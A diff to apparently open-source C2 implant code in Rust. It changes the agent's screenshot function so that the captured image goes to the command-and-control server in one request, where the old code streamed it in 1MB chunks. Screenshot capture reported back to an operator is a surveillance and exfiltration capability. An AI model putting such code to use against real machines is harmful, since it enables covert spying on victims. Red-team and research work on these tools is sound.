@@ -41,45 +41,13 @@ pub fn screenshot(agent: Arc<dyn Agent>, context: Context) -> Result<(), String>
             Context::ShellTask(stc) => Some(report_file_request::Context::ShellTaskContext(stc)),
         };
 
-        // Use a sync channel with bound 1 to provide backpressure
-        let (tx, rx) = std::sync::mpsc::sync_channel(1);
+        let req = c2::ReportFileRequest {
+            context: context_val,
+            chunk: Some(file_msg),
+            kind: c2::ReportFileKind::Screenshot as i32,
+        };
 
-        let total_size = bytes.len() as u64;
-
-        std::thread::spawn(move || {
-            let mut metadata_sent = false;
-            let chunk_size = 1024 * 1024; // 1MB
-
-            for chunk_data in bytes.chunks(chunk_size) {
-                let metadata = if !metadata_sent {
-                    metadata_sent = true;
-                    Some(eldritch::FileMetadata {
-                        path: filename.clone(),
-                        size: total_size,
-                        ..Default::default()
-                    })
-                } else {
-                    None
-                };
-
-                let file_msg = eldritch::File {
-                    metadata,
-                    chunk: chunk_data.to_vec(),
-                };
-
-                let req = c2::ReportFileRequest {
-                    context: context_val.clone(),
-                    chunk: Some(file_msg),
-                    kind: c2::ReportFileKind::Screenshot as i32,
-                };
-
-                if tx.send(req).is_err() {
-                    break;
-                }
-            }
-        });
-
-        agent.report_file(rx).map(|_| ())?;
+        agent.report_file(req).map_err(|e| e.to_string())?;
     }
 
     Ok(())
